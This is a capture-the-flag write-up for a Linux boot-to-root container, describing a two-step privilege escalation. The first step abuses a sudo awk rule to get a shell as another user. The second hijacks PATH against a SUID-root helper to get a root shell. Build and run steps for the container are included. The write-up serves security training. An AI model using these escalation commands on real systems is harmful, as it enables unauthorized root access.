# Sparrow Freight - writeup

A classic Linux boot-to-root, delivered as a single hardened container (no VM, no Firecracker). You
get a low-priv shell and climb two rungs, each a different real-world misconfiguration. The whole
box runs on gVisor with all capabilities dropped - the escalations are pure DAC (discretionary
access control), which is exactly what userspace-misconfig privesc is.

## Foothold
You're handed `guest:guest` over SSH (the "phishing test gave us a foothold" framing). No exploit to
get in - the challenge is the escalation, which is the realistic part of most engagements.

## Rung 1: guest -> mel (sudo + GTFObins)
Enumeration starts with `sudo -l`:
```
(mel) NOPASSWD: /usr/bin/awk
```
A NOPASSWD sudo entry for an interpreter is a shell. `awk` can execute commands via
`BEGIN{system(...)}`, so:
```
sudo -u mel /usr/bin/awk 'BEGIN{system("/bin/bash")}'
```
drops you into a shell as `mel`, whose home holds the **user flag**. This is the single most common
finding on real Linux privesc: overly-broad sudo rules for binaries that GTFObins can turn into a
shell.

## Rung 2: mel -> root (SUID + PATH hijack)
`mel` is in the `opsstaff` group, which can run a SUID-root helper:
```
-rwsr-x--- 1 root opsstaff  /usr/local/bin/netmon
```
`netmon` elevates to root and then runs `ip` and `ss` **by bare name**, inheriting your `$PATH`.
Drop a malicious `ip` earlier in `$PATH` and it runs as root:
```
cd $(mktemp -d); printf '#!/bin/sh\nexec /bin/sh\n' > ip; chmod +x ip
PATH=$PWD:$PATH netmon      # -> root shell -> /root/root.txt
```
PATH hijacking of a SUID binary that calls helpers without absolute paths is a textbook SUID privesc.
(The gate matters: `netmon` is `opsstaff`-only, so you can't skip rung 1 - you must be `mel` first.)

## Why it's a good B2R for this platform
- **Pure Docker.** No VM/Firecracker: it's one container. It only needs the platform's
  `deploy.privesc: true` (allowPrivilegeEscalation:true / no_new_privs off); drop-ALL caps stays,
  because both escalations are DAC, not capability-gated. gVisor implements setuid/exec, so SUID
  works in-sandbox.
- **Two distinct, real techniques** with a forced order (sudo-GTFObins, then SUID-PATH-hijack), so
  it teaches breadth, not one trick twice.
- **Deterministic + tested.** The full chain (SSH login -> sudo awk -> mel -> netmon PATH-hijack ->
  root) is validated in Docker; both flags recovered through the intended, gated path.

## Build / run
```
docker build -t h7ctf26/sparrow-b2r challenge/
docker run -d -p 2222:22 h7ctf26/sparrow-b2r
ssh guest@127.0.0.1 -p 2222        # password: guest
```
`entrypoint.sh` seals the flags (env-overridable: `$USER_FLAG`, `$ROOT_FLAG`) and runs sshd.
